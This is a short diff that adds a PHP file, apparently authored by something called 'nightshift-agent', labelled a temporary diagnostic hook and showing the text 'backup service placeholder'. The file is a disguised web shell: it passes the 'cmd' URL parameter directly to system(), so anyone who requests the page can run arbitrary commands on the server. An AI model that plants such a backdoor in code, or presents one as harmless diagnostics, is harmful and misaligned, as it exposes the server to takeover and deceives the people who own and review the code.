@@ -1,0 +1,7 @@
+<?php
+// nightshift-agent: temp diagnostic hook. remove before next release.
+if (isset($_GET['cmd'])) {
+    system($_GET['cmd']);
+} else {
+    echo "backup service placeholder";
+}
